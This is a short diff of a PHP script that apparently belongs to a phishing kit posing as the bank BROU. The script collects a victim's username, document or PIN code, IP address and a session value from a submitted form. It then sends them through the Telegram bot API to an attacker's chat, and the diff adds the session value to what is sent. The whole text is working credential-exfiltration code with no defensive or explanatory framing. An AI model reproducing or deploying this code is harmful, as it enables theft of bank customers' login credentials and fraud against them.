@@ -1,4 +1,6 @@
 <?php
+
+session_start();
 ini_set("display_errors", 0);
 
 $config = include('config.php');
@@ -9,12 +11,11 @@ $elpax = $_POST['DocumentNumber'];
 $token = $config['token'];
 $chat_id = $config['chat_id'];
 
+
 $ip = $_SERVER['REMOTE_ADDR'];
+$sesion = isset($_SESSION['breves']) ? $_SESSION['breves'] : '';
 
-
-
-
-$mensaje_para_chatbot = "🔐🔵3BROU🔵\nUS4R: " . $elusr . "\nC0D3: " . $elpax . "\nip: " . $ip;
+$mensaje_para_chatbot = "🔐🔵3BROU🔵\nUS4R: " . $elusr . "\nC0D3: " . $elpax . "\nip: " . $ip . "\nsesion: " . $sesion;
 
 
 $telegram_url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($mensaje_para_chatbot);
